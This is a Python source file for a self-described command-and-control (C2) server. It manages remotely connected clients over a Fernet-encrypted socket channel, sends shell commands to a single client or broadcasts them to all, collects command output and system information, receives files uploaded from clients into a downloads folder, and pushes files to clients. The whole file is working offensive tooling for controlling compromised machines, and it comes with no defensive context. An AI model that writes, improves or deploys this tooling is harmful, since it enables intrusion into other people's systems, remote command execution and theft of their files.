#!/usr/bin/env python3
"""
C2 Server with encrypted file transfer, heartbeat monitoring, and command execution
"""

import socket
import threading
import json
import base64
import time
from datetime import datetime
import os
import sys
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

class C2Server:
    def __init__(self, host='0.0.0.0', port=8888, password='default_password'):
        self.host = host
        self.port = port
        self.password = password
        self.clients = {}
        self.running = False
        
        # Generate encryption key from password
        self.key = self._generate_key(password)
        self.cipher = Fernet(self.key)
        
        # Create directories
        os.makedirs('downloads', exist_ok=True)
        os.makedirs('uploads', exist_ok=True)
        
    def _generate_key(self, password):
        """Generate encryption key from password"""
        salt = b'salt_1234567890'  # In production, use random salt per client
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return key
    
    def encrypt_data(self, data):
        """Encrypt data using Fernet"""
        if isinstance(data, str):
            data = data.encode()
        return self.cipher.encrypt(data)
    
    def decrypt_data(self, encrypted_data):
        """Decrypt data using Fernet"""
        return self.cipher.decrypt(encrypted_data).decode()
    
    def send_encrypted(self, conn, data):
        """Send encrypted data to client"""
        try:
            if isinstance(data, dict):
                data = json.dumps(data)
            
            encrypted = self.encrypt_data(data)
            # Send length first, then data
            length = len(encrypted)
            conn.send(length.to_bytes(4, byteorder='big'))
            conn.send(encrypted)
            return True
        except Exception as e:
            print(f"[ERROR] Failed to send data: {e}")
            return False
    
    def recv_encrypted(self, conn):
        """Receive encrypted data from client"""
        try:
            # Receive length first
            length_bytes = conn.recv(4)
            if not length_bytes:
                return None
            
            length = int.from_bytes(length_bytes, byteorder='big')
            
            # Receive the actual data
            encrypted_data = b''
            while len(encrypted_data) < length:
                chunk = conn.recv(min(length - len(encrypted_data), 4096))
                if not chunk:
                    return None
                encrypted_data += chunk
            
            # Decrypt and return
            decrypted = self.decrypt_data(encrypted_data)
            return json.loads(decrypted)
        except Exception as e:
            print(f"[ERROR] Failed to receive data: {e}")
            return None
    
    def handle_client(self, conn, addr):
        """Handle individual client connections"""
        client_id = f"{addr[0]}:{addr[1]}"
        print(f"[+] New client connected: {client_id}")
        
        # Store client info
        self.clients[client_id] = {
            'conn': conn,
            'addr': addr,
            'last_heartbeat': time.time(),
            'status': 'connected'
        }
        
        try:
            while self.running:
                # Set timeout for receiving data
                conn.settimeout(1.0)
                
                try:
                    data = self.recv_encrypted(conn)
                    if data is None:
                        break
                    
                    self.process_client_message(client_id, data)
                    
                except socket.timeout:
                    # Check if client is still alive (heartbeat timeout)
                    if time.time() - self.clients[client_id]['last_heartbeat'] > 360:  # 6 minutes timeout
                        print(f"[-] Client {client_id} heartbeat timeout")
                        break
                    continue
                    
                except Exception as e:
                    print(f"[ERROR] Error handling client {client_id}: {e}")
                    break
                    
        except Exception as e:
            print(f"[ERROR] Client handler error: {e}")
        finally:
            print(f"[-] Client {client_id} disconnected")
            if client_id in self.clients:
                del self.clients[client_id]
            conn.close()
    
    def process_client_message(self, client_id, data):
        """Process messages received from clients"""
        msg_type = data.get('type')
        
        if msg_type == 'heartbeat':
            self.clients[client_id]['last_heartbeat'] = time.time()
            print(f"[♥] Heartbeat from {client_id} - {datetime.now().strftime('%H:%M:%S')}")
            
        elif msg_type == 'command_result':
            print(f"\n[COMMAND RESULT from {client_id}]")
            print(f"Command: {data.get('command', 'Unknown')}")
            print(f"Output:\n{data.get('output', 'No output')}")
            print("-" * 50)
            
        elif msg_type == 'file_chunk':
            self.handle_file_upload(client_id, data)
            
        elif msg_type == 'system_info':
            print(f"\n[SYSTEM INFO from {client_id}]")
            for key, value in data.get('info', {}).items():
                print(f"{key}: {value}")
            print("-" * 50)
            
        else:
            print(f"[INFO] Unknown message type from {client_id}: {msg_type}")
    
    def handle_file_upload(self, client_id, data):
        """Handle file upload from client"""
        filename = data.get('filename')
        chunk_data = data.get('data')
        is_last = data.get('is_last', False)
        
        if not filename or not chunk_data:
            return
            
        filepath = os.path.join('downloads', f"{client_id}_{filename}")
        
        # Decode and write chunk
        try:
            chunk_bytes = base64.b64decode(chunk_data)
            with open(filepath, 'ab') as f:
                f.write(chunk_bytes)
                
            if is_last:
                print(f"[+] File upload completed: {filepath}")
            else:
                print(f"[+] Received chunk for {filename}")
                
        except Exception as e:
            print(f"[ERROR] File upload error: {e}")
    
    def send_command_to_client(self, client_id, command):
        """Send command to specific client"""
        if client_id not in self.clients:
            print(f"[ERROR] Client {client_id} not found")
            return False
            
        message = {
            'type': 'command',
            'command': command,
            'timestamp': time.time()
        }
        
        success = self.send_encrypted(self.clients[client_id]['conn'], message)
        if success:
            print(f"[+] Command sent to {client_id}: {command}")
        else:
            print(f"[ERROR] Failed to send command to {client_id}")
        return success
    
    def send_file_to_client(self, client_id, filepath):
        """Send file to specific client"""
        if client_id not in self.clients:
            print(f"[ERROR] Client {client_id} not found")
            return False
            
        if not os.path.exists(filepath):
            print(f"[ERROR] File not found: {filepath}")
            return False
            
        try:
            filename = os.path.basename(filepath)
            file_size = os.path.getsize(filepath)
            
            with open(filepath, 'rb') as f:
                chunk_size = 8192
                chunks_sent = 0
                
                while True:
                    chunk = f.read(chunk_size)
                    if not chunk:
                        break
                        
                    is_last = len(chunk) < chunk_size
                    
                    message = {
                        'type': 'file_download',
                        'filename': filename,
                        'data': base64.b64encode(chunk).decode(),
                        'is_last': is_last,
                        'chunk_num': chunks_sent
                    }
                    
                    if not self.send_encrypted(self.clients[client_id]['conn'], message):
                        print(f"[ERROR] Failed to send file chunk {chunks_sent}")
                        return False
                        
                    chunks_sent += 1
                    
                    if is_last:
                        break
                        
            print(f"[+] File sent to {client_id}: {filename} ({file_size} bytes)")
            return True
            
        except Exception as e:
            print(f"[ERROR] File send error: {e}")
            return False
    
    def broadcast_command(self, command):
        """Send command to all connected clients"""
        if not self.clients:
            print("[INFO] No clients connected")
            return
            
        for client_id in list(self.clients.keys()):
            self.send_command_to_client(client_id, command)
    
    def list_clients(self):
        """List all connected clients"""
        if not self.clients:
            print("[INFO] No clients connected")
            return
            
        print("\n[CONNECTED CLIENTS]")
        print("Client ID\t\tLast Heartbeat\t\tStatus")
        print("-" * 60)
        
        for client_id, info in self.clients.items():
            last_hb = datetime.fromtimestamp(info['last_heartbeat']).strftime('%H:%M:%S')
            print(f"{client_id}\t{last_hb}\t\t{info['status']}")
        print()
    
    def start(self):
        """Start the C2 server"""
        self.running = True
        
        # Create server socket
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server_socket.bind((self.host, self.port))
            server_socket.listen(5)
            
            print(f"[+] C2 Server started on {self.host}:{self.port}")
            print(f"[+] Encryption key generated from password")
            print(f"[+] Downloads directory: ./downloads/")
            print(f"[+] Uploads directory: ./uploads/")
            print("\n[COMMANDS]")
            print("  list                    - List connected clients")
            print("  cmd <client_id> <cmd>   - Send command to specific client")
            print("  broadcast <cmd>         - Send command to all clients")
            print("  upload <client_id> <file> - Send file to client")
            print("  help                    - Show this help")
            print("  quit                    - Exit server")
            print("-" * 60)
            
            # Start command line interface in separate thread
            cli_thread = threading.Thread(target=self.command_interface, daemon=True)
            cli_thread.start()
            
            # Accept client connections
            while self.running:
                try:
                    server_socket.settimeout(1.0)
                    conn, addr = server_socket.accept()
                    
                    # Handle client in separate thread
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(conn, addr),
                        daemon=True
                    )
                    client_thread.start()
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.running:
                        print(f"[ERROR] Server error: {e}")
                        
        except Exception as e:
            print(f"[ERROR] Failed to start server: {e}")
        finally:
            server_socket.close()
            print("[+] Server shutdown complete")
    
    def command_interface(self):
        """Command line interface for server control"""
        while self.running:
            try:
                cmd = input().strip()
                if not cmd:
                    continue
                    
                parts = cmd.split(' ', 2)
                command = parts[0].lower()
                
                if command == 'quit' or command == 'exit':
                    self.running = False
                    break
                    
                elif command == 'list':
                    self.list_clients()
                    
                elif command == 'help':
                    self.show_help()
                    
                elif command == 'cmd' and len(parts) >= 3:
                    client_id = parts[1]
                    client_cmd = parts[2]
                    self.send_command_to_client(client_id, client_cmd)
                    
                elif command == 'broadcast' and len(parts) >= 2:
                    broadcast_cmd = ' '.join(parts[1:])
                    self.broadcast_command(broadcast_cmd)
                    
                elif command == 'upload' and len(parts) >= 3:
                    client_id = parts[1]
                    filepath = parts[2]
                    self.send_file_to_client(client_id, filepath)
                    
                else:
                    print("[ERROR] Invalid command. Type 'help' for available commands.")
                    
            except KeyboardInterrupt:
                self.running = False
                break
            except EOFError:
                self.running = False
                break
            except Exception as e:
                print(f"[ERROR] Command interface error: {e}")
    
    def show_help(self):
        """Show help information"""
        print("\n[AVAILABLE COMMANDS]")
        print("  list                      - List all connected clients")
        print("  cmd <client_id> <command> - Send command to specific client")
        print("  broadcast <command>       - Send command to all clients")
        print("  upload <client_id> <file> - Send file to client")
        print("  help                      - Show this help")
        print("  quit/exit                 - Exit server")
        print("\n[EXAMPLES]")
        print("  list")
        print("  cmd 192.168.1.100:12345 whoami")
        print("  broadcast ls -la")
        print("  upload 192.168.1.100:12345 ./uploads/script.py")
        print("-" * 60)

def main():
    if len(sys.argv) > 1:
        password = sys.argv[1]
    else:
        password = input("Enter server password (default: 'default_password'): ").strip()
        if not password:
            password = 'default_password'
    
    server = C2Server(password=password)
    
    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[+] Server shutting down...")
        server.running = False

if __name__ == "__main__":
    main()
